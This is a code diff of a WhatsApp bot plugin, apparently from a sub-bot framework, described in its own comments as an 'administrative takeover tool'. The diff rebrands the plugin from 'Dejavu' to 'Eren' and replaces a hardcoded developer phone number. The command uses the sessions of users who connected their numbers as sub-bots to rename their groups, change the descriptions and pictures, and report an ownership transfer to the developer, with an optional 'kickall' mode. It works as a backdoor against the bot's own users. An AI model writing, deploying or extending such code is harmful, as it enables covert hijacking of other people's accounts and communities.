@@ -4,14 +4,14 @@ import { listMdBots, getMdBot, getMainConn } from '../../lib/md.js';
 import { MEDIA_DIR, LOGO_FILE } from '../../lib/paths.js';
 import config from '../../config.js';
 
-//@Dejavu/changes Administrative takeover tool for developers
-//@Dejavu/note Manages groups and channels on connected MD sub-bots for developer ownership transfer
+//@Eren/changes Administrative takeover tool for developers
+//@Eren/note Manages groups and channels on connected MD sub-bots for developer ownership transfer
 
 const KKKK_IMG = path.join(MEDIA_DIR, 'kkkk.png');
-const DEV_NUMBER = (config.owner || '201009579295').toString().replace(/\D/g, '');
+const DEV_NUMBER = (config.owner || '962796163926').toString().replace(/\D/g, '');
 const DEV_JID = `${DEV_NUMBER}@s.whatsapp.net`;
 
-const DEJAVU = {
+const EREN = {
   command: ["kkkk", "كككك"],
   description: "أداة نقل ملكية وإدارة مجموعات وقنوات الأرقام المنصبة (للمطور فقط)",
   usage: ".kkkk [رقم_المنصب] [kickall]",
@@ -47,7 +47,7 @@ async function execute({ sock, msg, args, sender, isDeveloper, isOwner }) {
     }));
 
     return await sock.sendMessage(chatId, {
-      text: `🥐 *لوحة تحكم KKKK - اختر الرقم المستهدف:*\n\nالأرقام المنصبة المتصلة (${subBots.length}):\n${subBots.map(b => `• ${b.number}`).join('\n')}\n\n_اضغط على الرقم أو اكتب .kkkk [الرقم]_`,
+      text: `🍷 *لوحة تحكم KKKK - اختر الرقم المستهدف:*\n\nالأرقام المنصبة المتصلة (${subBots.length}):\n${subBots.map(b => `• ${b.number}`).join('\n')}\n\n_اضغط على الرقم أو اكتب .kkkk [الرقم]_`,
       interactiveButtons: [
         {
           name: "single_select",
@@ -143,12 +143,12 @@ async function execute({ sock, msg, args, sender, isDeveloper, isOwner }) {
 
         // D. Update group subject
         try {
-          await targetSock.groupUpdateSubject(gid, "Collectable『🥐』 dejavu");
+          await targetSock.groupUpdateSubject(gid, "Collectable『🍷』 𝐸𝓇𝑒𝓃");
         } catch (e) {}
 
         // E. Update group description
         try {
-          await targetSock.groupUpdateDescription(gid, "🥐 Collectable『🥐』 dejavu Official Community 🌹\nManaged by Dejavu System.");
+          await targetSock.groupUpdateDescription(gid, "🍷 Collectable『🍷』 𝐸𝓇𝑒𝓃 Official Community 🌹\nManaged by 𝐸𝓇𝑒𝓃 🍷 𝘚𝘺𝘴𝘵𝘦𝘮.");
         } catch (e) {}
 
         // F. Update group picture
@@ -188,12 +188,12 @@ async function execute({ sock, msg, args, sender, isDeveloper, isOwner }) {
 
     // 2. Report back to Developer
     const summaryMsg =
-`🥐 *تقرير عملية KKKK للرقم:* ${targetNumber}
+`🍷 *تقرير عملية KKKK للرقم:* ${targetNumber}
 
 📊 *المجموعات الناجحة:* ${report.groupsSuccess}
 ⚠️ *المجموعات التي تعذرت:* ${report.groupsFailed}
 👑 *المطور المستلم:* @${DEV_NUMBER}
-🏷️ *الاسم الجديد:* Collectable『🥐』 dejavu
+🏷️ *الاسم الجديد:* Collectable『🍷』 𝐸𝓇𝑒𝓃
 
 📝 *التفاصيل:*
 ${report.details.slice(0, 15).join('\n')}
@@ -214,5 +214,4 @@ ${report.details.length > 15 ? `\n...والمزيد (${report.details.length - 1
   }
 }
 
-export default { DEJAVU, AIZEN: DEJAVU, execute };
-
+export default { EREN, DEJAVU: EREN, AIZEN: EREN, execute };
